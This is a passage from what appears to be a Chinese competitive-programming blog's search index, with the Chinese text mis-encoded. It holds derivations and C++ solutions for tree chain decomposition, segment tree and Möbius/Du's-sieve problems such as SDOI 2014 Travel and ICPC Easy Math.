æ¯æ¬¡å¦‚æœä¿®æ”¹æŸä¸ªç‚¹çš„æƒå€¼ $w_u$ ä¸ºæ–°æƒå€¼ $w$ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä¿®æ”¹åŸå€¼ $w_u=w$ æŸ¥è¯¢æ—¶ç›´æ¥è¯¢é—® $u$ åˆ° $v$ è·¯å¾„ä¸Šæ ‘é“¾å‰–åˆ†å¯¹åº”èŠ‚ç‚¹ç¼–å·çš„åŒºé—´ä¸ºå®—æ•™ $x$ çš„åŒºé—´æœ€å€¼å’ŒåŒºé—´å’Œã€‚ ","date":"2021-09-29","objectID":"/posts/cpsdoi-2014-%E6%97%85%E8%A1%8C/:0:0","tags":["æ ‘é“¾å‰–åˆ†","æƒå€¼çº¿æ®µæ ‘","åŠ¨æ€å¼€ç‚¹"],"title":"[SDOI 2014] æ—…è¡Œ","uri":"/posts/cpsdoi-2014-%E6%97%85%E8%A1%8C/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e5 + 5, M = N \u003c\u003c 1; int root[N], Idx, W[N], C[N], w, c, u, v, n, m, h[N], e[M], ne[M], idx, id[N], cnt, dep[N], Size[N], top[N], fa[N], son[N]; string op; struct SegmentTree { int l, r, sum, mx; } tr[N \u003c\u003c 5]; void add(int a, int b) { e[idx] = b, ne[idx] = h[a], h[a] = idx ++; } void dfs1(int u, int father, int depth) { dep[u] = depth, fa[u] = father, Size[u] = 1; for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == father) continue; dfs1(j, u, depth + 1); Size[u] += Size[j]; if (Size[son[u]] \u003c Size[j]) son[u] = j; } } void dfs2(int u,int t) { id[u] = ++ cnt, top[u] = t; if (!son[u]) return ; dfs2(son[u], t); for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == fa[u] || j == son[u]) continue; dfs2(j, j); } } void pushup(int u) { tr[u].sum = tr[tr[u].l].sum + tr[tr[u].r].sum; tr[u].mx = max(tr[tr[u].l].mx, tr[tr[u].r].mx); } void modify(int \u0026u, int l, int r, int pos, int c) { if (!u) u = ++ Idx; if (l == pos \u0026\u0026 r == pos) { tr[u].mx = tr[u].sum = c; return ; } int mid = l + r \u003e\u003e 1; if (pos \u003c= mid) { modify(tr[u].l, l, mid, pos, c); } else { modify(tr[u].r, mid + 1, r, pos, c); } pushup(u); } int ask_sum(int u, int l, int r, int ql, int qr) { if(l \u003e qr || r \u003c ql) return 0; if (!u) return 0; if (l \u003e= ql \u0026\u0026 r \u003c= qr) return tr[u].sum; int mid = l + r \u003e\u003e 1, res = 0; if (l \u003c= mid) res += ask_sum(tr[u].l, l, mid, ql, qr); if (r \u003e mid) res += ask_sum(tr[u].r, mid + 1, r, ql, qr); return res; } int ask_max(int u, int l, int r, int ql, int qr) { if(l \u003e qr || r \u003c ql) return 0; if (!u) return 0; if (l \u003e= ql \u0026\u0026 r \u003c= qr) return tr[u].mx; int mid = l + r \u003e\u003e 1, res = 0; if (l \u003c= mid) res = max(res, ask_max(tr[u].l, l, mid, ql, qr)); if (r \u003e mid) res = max(res, ask_max(tr[u].r, mid + 1, r, ql, qr)); return res; } int ask_path_sum(int u, int v, int c) { int res = 0; while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); res += ask_sum(root[c], 1, N - 1, id[top[u]], id[u]); u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); res += ask_sum(root[c], 1, N - 1, id[v], id[u]); return res; } int ask_path_max(int u, int v, int c) { int res = 0; while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); res = max(res, ask_max(root[c], 1, N - 1, id[top[u]], id[u])); u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); res = max(res, ask_max(root[c], 1, N - 1, id[v], id[u])); return res; } signed main() { memset(h, -1, sizeof h); cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; i ++) { cin \u003e\u003e W[i] \u003e\u003e C[i]; } for (int i = 0; i \u003c n - 1; i ++) { cin \u003e\u003e u \u003e\u003e v; add(u, v), add(v, u); } dfs1(1, -1, 1), dfs2(1, 1); for (int i = 1; i \u003c= n; i ++) { modify(root[C[i]], 1, N - 1, id[i], W[i]); } while (m --) { cin \u003e\u003e op \u003e\u003e u; if (op == \"CC\") { cin \u003e\u003e c; modify(root[C[u]], 1, N - 1, id[u], 0); modify(root[c], 1, N - 1, id[u], W[u]); C[u] = c; } else if (op == \"CW\") { cin \u003e\u003e w; modify(root[C[u]], 1, N - 1, id[u], w); W[u] = w; } else if (op == \"QS\") { cin \u003e\u003e v; cout \u003c\u003c ask_path_sum(u, v, C[u]) \u003c\u003c endl; } else if (op == \"QM\") { cin \u003e\u003e v; cout \u003c\u003c ask_path_max(u, v, C[u]) \u003c\u003c endl; } } } ","date":"2021-09-29","objectID":"/posts/cpsdoi-2014-%E6%97%85%E8%A1%8C/:1:0","tags":["æ ‘é“¾å‰–åˆ†","æƒå€¼çº¿æ®µæ ‘","åŠ¨æ€å¼€ç‚¹"],"title":"[SDOI 2014] æ—…è¡Œ","uri":"/posts/cpsdoi-2014-%E6%97%85%E8%A1%8C/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€æ£µ $n$ ä¸ªèŠ‚ç‚¹çš„æ ‘å’Œ $m$ æ¬¡æ“ä½œï¼Œæ¯æ¬¡æ“ä½œæŠŠ $u$ åˆ° $v$ è·¯å¾„ä¸Šçš„èŠ‚ç‚¹åŠ ä¸Šä¸€ä¸ªé¢œè‰² $z$ï¼Œæœ€åè¯¢é—®æ¯ä¸ªç‚¹æœ€å¤šé¢œè‰²çš„ç¼–å·(å¦‚æœç›¸åŒå–ç¼–å·æœ€å°) $1 \\le n,m,z \\le 10^5$ åˆ†æï¼š æ­¤é¢˜æ˜¯çº¿æ®µæ ‘åˆå¹¶æ¨¡æ¿é¢˜ï¼Œè¿™é‡Œç»™å‡ºæ ‘é“¾å‰–åˆ†çš„åšæ³•ã€‚ æ¯æ¬¡æ“ä½œä¿®æ”¹æ ‘ä¸Šçš„è·¯å¾„ï¼Œå¯ä»¥ç”¨æ ‘é“¾å‰–åˆ†ç»´æŠ¤ä¸€ä¸‹ï¼Œæ³¨æ„åˆ° $z$ çš„èŒƒå›´æ˜¯ $10^5$ ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åœ¨æ ‘ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šå¼€ä¸€ä¸ªæ¡¶è®°å½•é¢œè‰²ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æƒå€¼çº¿æ®µæ ‘çš„åŠ¨æ€å¼€ç‚¹ã€‚ä¸è¿‡è¿™é‡Œæœ‰æ›´ä¼˜åšæ³•ï¼Œå› ä¸ºæ ‘é“¾å‰–åˆ†å‡ºæ¥çš„åºåˆ—å¯¹åº”æ ‘ä¸Šçš„å”¯ä¸€è·¯å¾„ï¼Œæ‰€ä»¥é¢˜ç›®çš„æ“ä½œå°±ç›¸å½“äºï¼šç»™å®šä¸€ä¸ªåºåˆ—ï¼Œæ¯æ¬¡åœ¨ $[l,r]$ åŒºé—´æ·»åŠ ä¸€ä¸ªé¢œè‰²ï¼Œè¯¢é—®æ¯ä¸ªç‚¹æœ€å¤šé¢œè‰²çš„ç¼–å·ã€‚è¿™æ ·å°±å¯ä»¥ç”¨å·®åˆ†çš„æ€æƒ³ï¼Œæ¯æ¬¡åœ¨ $l$ ç‚¹ $+1$ï¼Œ$r + 1$ ç‚¹ $-1$ï¼Œæˆ‘ä»¬æŠŠ $l$ æ’åºï¼Œæ‰«æ $1 \\sim N$ çš„æ¯ä¸ªç‚¹ï¼Œæ¯æ¬¡éå†è¿™ä¸ªç‚¹çš„è¯¢é—®ï¼ŒæŠŠå¯¹è¿™ä¸ªç‚¹çš„ä¿®æ”¹åœ¨æƒå€¼çº¿æ®µæ ‘ä¸Šæ“ä½œï¼Œç„¶åæŸ¥è¯¢ä¸€ä¸‹æœ€å¤§çš„ä¸‹æ ‡ã€‚ æ­¤é¢˜åœ¨ $\\text{acwing}$ ä¸Š $z$ çš„æ•°æ®èŒƒå›´ä¸º $10^9$ æ‰€ä»¥æœ€å¥½ç¦»æ•£åŒ–ä¸€ä¸‹ã€‚ ","date":"2021-09-28","objectID":"/posts/cp%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97-%E9%9B%A8%E5%A4%A9%E7%9A%84%E5%B0%BE%E5%B7%B4/:0:0","tags":["çº¿æ®µæ ‘åˆå¹¶","æ ‘é“¾å‰–åˆ†","çº¿æ®µæ ‘"],"title":"[ç®—æ³•ç«èµ›è¿›é˜¶æŒ‡å—] é›¨å¤©çš„å°¾å·´","uri":"/posts/cp%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97-%E9%9B%A8%E5%A4%A9%E7%9A%84%E5%B0%BE%E5%B7%B4/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long #define find(x) lower_bound(num.begin(), num.end(), x) - num.begin() using namespace std; const int N = 1e5 + 5, M = N \u003c\u003c 1; int z[N], a[N], u[N], v[N], n, m, h[N], e[M], ne[M], idx, id[N], ans[N], mp[N], cnt, dep[N], Size[N], top[N], fa[N], son[N]; vector\u003cint\u003e x[N], num; struct SegmentTree { int l, r, mx, val; } tr[N \u003c\u003c 2]; void add(int a, int b) { e[idx] = b, ne[idx] = h[a], h[a] = idx ++; } void dfs1(int u, int father, int depth) { dep[u] = depth, fa[u] = father, Size[u] = 1; for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == father) continue; dfs1(j, u, depth + 1); Size[u] += Size[j]; if (Size[son[u]] \u003c Size[j]) son[u] = j; } } void dfs2(int u,int t) { id[u] = ++ cnt, top[u] = t, mp[cnt] = u; if (!son[u]) return ; dfs2(son[u], t); for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == fa[u] || j == son[u]) continue; dfs2(j, j); } } void pushup(int u) { if (tr[u \u003c\u003c 1].mx \u003e= tr[u \u003c\u003c 1 | 1].mx) { tr[u].mx = tr[u \u003c\u003c 1].mx; tr[u].val = tr[u \u003c\u003c 1].val; } else { tr[u].mx = tr[u \u003c\u003c 1 | 1].mx; tr[u].val = tr[u \u003c\u003c 1 | 1].val; } } void build(int u, int l, int r) { if (l == r) { tr[u] = {l, r, 0, l}; } else { tr[u] = {l, r}; int mid = l + r \u003e\u003e 1; build(u \u003c\u003c 1, l, mid), build(u \u003c\u003c 1 | 1, mid + 1, r); pushup(u); } } void modify(int u, int pos, int c) { if (tr[u].l == pos \u0026\u0026 tr[u].r == pos) { tr[u].mx += c; } else { int mid = tr[u].l + tr[u].r \u003e\u003e 1; if (pos \u003c= mid) { modify(u \u003c\u003c 1, pos, c); } else { modify(u \u003c\u003c 1 | 1, pos, c); } pushup(u); } } void modify_path(int u, int v, int k) { while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); x[id[top[u]]].push_back(k), x[id[u] + 1].push_back(-k); u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); x[id[v]].push_back(k), x[id[u] + 1].push_back(-k); } signed main() { memset(h, -1, sizeof h); cin \u003e\u003e n \u003e\u003e m; for (int i = 0; i \u003c n - 1; i ++) { cin \u003e\u003e u[i] \u003e\u003e v[i]; add(u[i], v[i]), add(v[i], u[i]); } dfs1(1, -1, 1), dfs2(1, 1); build(1, 1, N - 1); for (int i = 1; i \u003c= m; i ++) { cin \u003e\u003e u[i] \u003e\u003e v[i] \u003e\u003e z[i]; num.push_back(z[i]); } sort(num.begin(), num.end()); num.erase(unique(num.begin(), num.end()), num.end()); for (int i = 1; i \u003c= m; i ++) { modify_path(u[i], v[i], find(z[i]) + 1); } for (int i = 1; i \u003c N; i ++) { for (int j = 0; j \u003c x[i].size(); j ++) { if (x[i][j] \u003e 0) { modify(1, x[i][j], 1); } else { modify(1, -x[i][j], -1); } } ans[mp[i]] = tr[1].mx ? num[tr[1].val - 1] : 0; } for (int i = 1; i \u003c= n; i ++) cout \u003c\u003c ans[i] \u003c\u003c endl; } ","date":"2021-09-28","objectID":"/posts/cp%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97-%E9%9B%A8%E5%A4%A9%E7%9A%84%E5%B0%BE%E5%B7%B4/:1:0","tags":["çº¿æ®µæ ‘åˆå¹¶","æ ‘é“¾å‰–åˆ†","çº¿æ®µæ ‘"],"title":"[ç®—æ³•ç«èµ›è¿›é˜¶æŒ‡å—] é›¨å¤©çš„å°¾å·´","uri":"/posts/cp%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97-%E9%9B%A8%E5%A4%A9%E7%9A%84%E5%B0%BE%E5%B7%B4/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜æ„ æ¯æ¬¡ä» $[1,n]$ ä¸­é€‰æ‹©ä¸€ä¸ªæ•°åŠ åˆ°ä¸€ä¸ªåºåˆ—æœ«å°¾ï¼Œå½“ $\\gcd(a_1,\\cdots,a_n)=1$ æ—¶åœæ­¢ï¼Œæ±‚æœŸæœ›é•¿åº¦ï¼Œå¯¹ $p$ å–æ¨¡ $1\\le n \\le 10^{11},n\u003c p \\le 10 ^{12}$ åˆ†æï¼š è®¾ $E(x)$ ä¸ºé•¿åº¦ä¸º $x$ çš„æœŸæœ›ï¼Œé‚£ä¹ˆæ ¹æ®æœŸæœ›å®šä¹‰ $$E(x)=\\sum_{i=1}^{\\infty}P(x=i) \\times i$$ æŠŠ $i$ æ”¹ä¸º $\\sum\\limits_{j=1} ^{i}$ $$E(x)=\\sum_{i=1}^{\\infty}P(x=i) \\sum_{j=1}^{i}$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{i=1}^{\\infty}\\sum_{j = i}^{\\infty}P(x=j)$$ ç­‰ä»·äº $$\\sum_{i=1}^{\\infty}P(x\\ge i)$$ åŒ–ç®€ä¸€ä¸‹ $$\\sum_{i=1}^{\\infty}P(x\\ge i)=1+\\sum_{i=1}^{\\infty}P(x\u003e i)$$ è€ƒè™‘ $P(x\u003e i)$ï¼Œè¿›è¡Œå®¹æ–¥ $1-P(x \\le i)$ å°±ç­‰ä»·äº $$1-P(\\gcd(a_1,\\cdots,a_i)=1)$$ æšä¸¾ $a_i$ åœ¨ $[1,n]$ ä¸­çš„å–å€¼ $$1-\\sum_{a_1=1}^{n}\\cdots\\sum_{a_i=1}^{n}\\frac{[\\gcd(a_1,\\cdots,a_i)=1]}{n^{i}}$$ è«æ¯”ä¹Œæ–¯åæ¼” $$1-\\sum_{a_1=1}^{n}\\cdots\\sum_{a_i=1}^{n}\\frac{\\sum\\limits_{d \\mid\\gcd(a_1,\\cdots,a_i) }\\mu(d)}{n^{i}}$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$1-\\frac{\\sum\\limits_{d=1}^{n}\\mu(d)\\lfloor \\dfrac{n}{d} \\rfloor^i}{n^i}$$ æŠŠ $1$ æ‹¿åˆ°åˆ†å­ï¼Œå’Œç¬¬ä¸€é¡¹æŠµæ¶ˆäº† $$-\\frac{\\sum\\limits_{d=2}^{n}\\mu(d)\\lfloor \\dfrac{n}{d} \\rfloor^i}{n^{i}}$$ ä»£å…¥åˆ° $1+\\sum\\limits_{i=1}^{\\infty}P(len \u003e i)$ å¾— $$1-\\sum_{i=1}^{\\infty}\\frac{\\sum\\limits_{d=2}^{n}\\mu(d)\\lfloor \\dfrac{n}{d} \\rfloor^i}{n^{i}}$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$1-\\sum_{d=2}^{n}\\mu(d)\\sum_{i=1}^{\\infty}(\\frac{\\lfloor \\dfrac{n}{d} \\rfloor}{n})^i$$ $\\sum\\limits_{i=1}^{\\infty}(\\dfrac{\\lfloor \\dfrac{n}{d} \\rfloor}{n})^i$ è¿™æ˜¯ä¸ªç­‰æ¯”çº§æ•°ï¼Œæé™ä¸º $\\dfrac{é¦–é¡¹}{1-å…¬æ¯”}$ $$1-\\sum_{d=2}^{n}\\mu(d)\\frac{\\lfloor \\dfrac{n}{d} \\rfloor}{n-\\lfloor \\dfrac{n}{d} \\rfloor}$$ å°±å¯ä»¥ç”¨æœæ•™ç­›äº† ","date":"2021-09-23","objectID":"/posts/cp2021-cccc%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E5%8F%AF%E6%80%9C%E7%9A%84%E7%AE%80%E5%8D%95%E9%A2%98/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›","æ¦‚ç‡æœŸæœ›"],"title":"[2021 CCCCå¤©æ¢¯èµ›] å¯æ€œçš„ç®€å•é¢˜","uri":"/posts/cp2021-cccc%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E5%8F%AF%E6%80%9C%E7%9A%84%E7%AE%80%E5%8D%95%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n, mod; cin \u003e\u003e n \u003e\u003e mod; int cnt = 0, N = 2.2e7 + 5; vector\u003cint\u003e primes(N), mobius(N), sum(N); vector\u003cbool\u003e st(N); auto sieve = [\u0026](int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = i * primes[j]; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) { sum[i] = (sum[i - 1] + mobius[i] + mod) % mod; } }; sieve(N - 1); auto qmul = [\u0026](int a, int b) { return (__int128)a * b % mod; }; auto qmi = [\u0026](int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = qmul(res, a); a = qmul(a, a); b \u003e\u003e= 1; } return res; }; unordered_map\u003cint, int\u003e mp; function\u003cint(int)\u003e Sum = [\u0026](int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = 1; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - qmul(r - l + 1, Sum(n / l)) % mod + mod) % mod; } return mp[n] = res; }; int res = 1; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); int t = qmul(n / l, qmi(n - n / l, mod - 2)); res = (res - qmul(Sum(r) - Sum(l - 1), t) + mod) % mod; } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2021-09-23","objectID":"/posts/cp2021-cccc%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E5%8F%AF%E6%80%9C%E7%9A%84%E7%AE%80%E5%8D%95%E9%A2%98/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›","æ¦‚ç‡æœŸæœ›"],"title":"[2021 CCCCå¤©æ¢¯èµ›] å¯æ€œçš„ç®€å•é¢˜","uri":"/posts/cp2021-cccc%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E5%8F%AF%E6%80%9C%E7%9A%84%E7%AE%80%E5%8D%95%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ $$\\sum_{i=1}^{n}\\sum_{j=1}^{n} \\varphi(\\gcd(i,j))$$ $1 \\le n \\le 10^9$ï¼Œå¯¹ $10^9+7$ å–æ¨¡ åˆ†æï¼š æšä¸¾ $\\gcd(i,j)$ $$\\sum_{d=1}^{n}\\varphi(d)\\sum_{i=1}^{n}\\sum_{j=1}^{n}[\\gcd(i,j)=d]$$ å°† $d$ æ‹¿åˆ°ä¸Šç•Œ $$\\sum_{d=1}^{n}\\varphi(d)\\sum_{i=1}^{\\lfloor \\frac{n}{d} \\rfloor}\\sum_{j=1}^{\\lfloor \\frac{n}{d} \\rfloor}[\\gcd(i,j)=1]$$ å› ä¸º $\\sum\\limits_{i=1}^{n}\\sum\\limits_{i=1}^{n}[\\gcd(i,j)=1]=\\sum\\limits_{i=1}^{n}2\\varphi(i)-1$ï¼Œæ‰€ä»¥ $$\\sum_{d=1}^{n}\\varphi(d)(\\sum_{i=1}^{\\lfloor \\frac{n}{d} \\rfloor}2\\varphi(i)-1)$$ å†ç”¨ä¸€ä¸‹æœæ•™ç­›å°±å¥½äº† ","date":"2021-09-23","objectID":"/posts/cpnc-200008-lady-layton-with-math/:0:0","tags":["æœæ•™ç­›"],"title":"[NC 200008] Lady Layton with Math","uri":"/posts/cpnc-200008-lady-layton-with-math/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 1e9 + 7; int T, n, euler[N], primes[N], cnt, sum[N]; bool st[N]; unordered_map\u003cint, int\u003e mp; void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; primes[j] \u003c= n / i; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { euler[t] = primes[j] * euler[i]; break; } euler[t] = (primes[j] - 1) * euler[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = (sum[i - 1] + euler[i]) % mod; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = n * (n + 1) / 2 % mod; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - Sum(n / l) * (r - l + 1) % mod + mod) % mod; } return mp[n] = res; } signed main() { get_eulers(N - 1); cin \u003e\u003e T; while (T --) { int res = 0; cin \u003e\u003e n; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res + (Sum(r) - Sum(l - 1)) * (2 * Sum(n / l) - 1) % mod + mod) % mod; } cout \u003c\u003c res \u003c\u003c endl; } } ","date":"2021-09-23","objectID":"/posts/cpnc-200008-lady-layton-with-math/:1:0","tags":["æœæ•™ç­›"],"title":"[NC 200008] Lady Layton with Math","uri":"/posts/cpnc-200008-lady-layton-with-math/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ $$\\sum_{i=1}^{m} \\mu(in)$$ $m \\le 2Ã—10^9,n\\le 10^{12}$ åˆ†æï¼š é¦–å…ˆåˆ†æ $n$ çš„å› å­ä¸­æœ‰æ²¡æœ‰å¹³æ–¹ï¼Œå¦‚æœæœ‰é‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $0$ å¦‚æœ $n$ çš„å› å­æ²¡æœ‰å¹³æ–¹ï¼Œè®¾æŸä¸ªå› å­ä¸º $p$ï¼ŒåŸå¼å°±å¯ä»¥æ‹†æˆ $$\\sum_{i=1} ^{m}\\mu(i\\cdot\\frac{n}{p}\\cdot p)$$ è«æ¯”ä¹Œæ–¯å‡½æ•°æ˜¯ç§¯æ€§å‡½æ•°ï¼Œè€ƒè™‘æŠŠ $p$ åˆ†å‡ºå»ï¼Œé‚£ä¹ˆ $p$ ä¸ $\\dfrac{n}{p}$ ä¸€å®šæ˜¯äº’è´¨çš„ï¼Œä½† $i\\cdot \\dfrac{n}{p}$ å¹¶ä¸ä¸€å®šäº’è´¨ï¼Œé‚£ä¹ˆå°±è€ƒè™‘ $i$ ä¸ $p$ çš„å…³ç³»ï¼Œåœ¨ $[1,m]$ ä¸­åªæœ‰ $p$ çš„å€æ•°æ‰ä¸ $p$ ä¸äº’è´¨ï¼Œæ‰€ä»¥è¦åŠ ä¸Šè¿™ä¸€éƒ¨åˆ†ã€‚ $$\\sum_{i=1}^{m}\\mu(i\\cdot\\frac{n}{p})\\mu(p)+\\sum_{i=1}^{\\lfloor \\frac{m}{p} \\rfloor}\\mu(i\\cdot p \\cdot \\frac{n}{p})$$ ç”±äº $p$ æ˜¯å•å› å­ï¼Œæ‰€ä»¥ $\\mu(p)=-1$ $$\\sum_{i=1}^{\\lfloor \\frac{m}{p} \\rfloor}\\mu(i n) - \\sum_{i=1}^{m}\\mu(i\\cdot\\frac{n}{p})$$ è®¾ $S(n,m)=\\sum\\limits_{i=1}^{m}\\mu(in)$ï¼Œé‚£ä¹ˆå¾—åˆ°é€’æ¨å¼ $$S(n,m)=S(n,\\frac{m}{p})-S(\\frac{n}{p},m)$$ é‚£ä¹ˆå°±å¯ä»¥æ¯æ¬¡æšä¸¾ $n$ çš„è´¨å› å­ $p$ï¼Œé€’å½’æ±‚è§£ï¼Œé‚£ä¹ˆé€’å½’è¾¹ç•Œå°±æ˜¯ $S(0,n)$ å’Œ $S(1,m)$ï¼Œä¹Ÿå°±æ˜¯è«æ¯”ä¹Œæ–¯å‡½æ•°å‰ç¼€å’Œï¼Œç”¨æœæ•™ç­›å¤„ç†ä¸€ä¸‹å°±å¥½äº† ","date":"2021-09-18","objectID":"/posts/cp2018-icpc%E5%BE%90%E5%B7%9E%E7%BD%91%E7%BB%9C%E8%B5%9B-easy-math/:0:0","tags":["æœæ•™ç­›"],"title":"[2018 ICPCå¾å·ç½‘ç»œèµ›] Easy Math","uri":"/posts/cp2018-icpc%E5%BE%90%E5%B7%9E%E7%BD%91%E7%BB%9C%E8%B5%9B-easy-math/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5; int t, n, m, mobius[N], primes[N], cnt, sum[N]; bool st[N]; unordered_map\u003cint, int\u003e mp; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i]; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = 1; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res -= Sum(n / l) * (r - l + 1); } return mp[n] = res; } int S(int n, int m) { if (m == 0) return 0; if (n == 1) return Sum(m); int flag = 0; for (int i = 2; i * i \u003c= n; i ++) { if (n % i == 0) { flag = 1; return S(n, m / i) - S(n / i, m); } } if (!flag) return S(n, m / n) - S(1, m); } signed main() { get_mobius(N - 1); cin \u003e\u003e m \u003e\u003e n; t = n; for (int i = 2; i * i \u003c= t; i ++) { if (t % i == 0) { int cnt = 0; while (t % i == 0) { t /= i; cnt ++; if (cnt == 2) { cout \u003c\u003c 0 \u003c\u003c endl; return 0; } } } } cout \u003c\u003c S(n, m) \u003c\u003c endl; } ","date":"2021-09-18","objectID":"/posts/cp2018-icpc%E5%BE%90%E5%B7%9E%E7%BD%91%E7%BB%9C%E8%B5%9B-easy-math/:1:0","tags":["æœæ•™ç­›"],"title":"[2018 ICPCå¾å·ç½‘ç»œèµ›] Easy Math","uri":"/posts/cp2018-icpc%E5%BE%90%E5%B7%9E%E7%BD%91%E7%BB%9C%E8%B5%9B-easy-math/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}\\sum_{p=1}^{\\lfloor \\frac{n}{j} \\rfloor} \\sum_{q=1}^{\\lfloor \\frac{n}{j} \\rfloor}[\\gcd(i,j)=1][\\gcd(p,q)=1]$$ å¯¹ $998244353$ å–æ¨¡ åˆ†æï¼š å¸¸è§„å¥—ç”¨è«æ¯”ä¹Œæ–¯åæ¼”å¼å­ä¼šå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥è¿™é‡Œåå‘æŠŠä¸Šç•Œæ‹¿ä¸‹æ¥ $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}\\sum_{p=1}^{n} \\sum_{q=1}^{n}[\\gcd(i,j)=1][\\gcd(p,q)=j]$$ é‚£ä¹ˆå°±æ˜¯ $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}\\sum_{k=1}^{n} [\\gcd(i,j,k)=1]$$ å†æ¥è«æ¯”ä¹Œæ–¯åæ¼” $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}\\sum_{k=1}^{n} \\sum_{d \\mid \\gcd(i,j,k)}\\mu(d)$$ åŒ–ç®€ä¸€ä¸‹ $$\\sum_{d=1}^{n}\\mu(d) \\lfloor\\frac{n}{d}\\rfloor^3$$ å°±å¯ä»¥ç”¨æœæ•™ç­›äº† ","date":"2021-09-17","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p6055-rc-02-gcd/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[æ´›è°· P6055] [RC-02] GCD","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p6055-rc-02-gcd/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 998244353; int n, mobius[N], primes[N], cnt, sum[N], res; bool st[N]; unordered_map\u003cint, int\u003e mp; void get_mobius(int n) { mobius[1] = 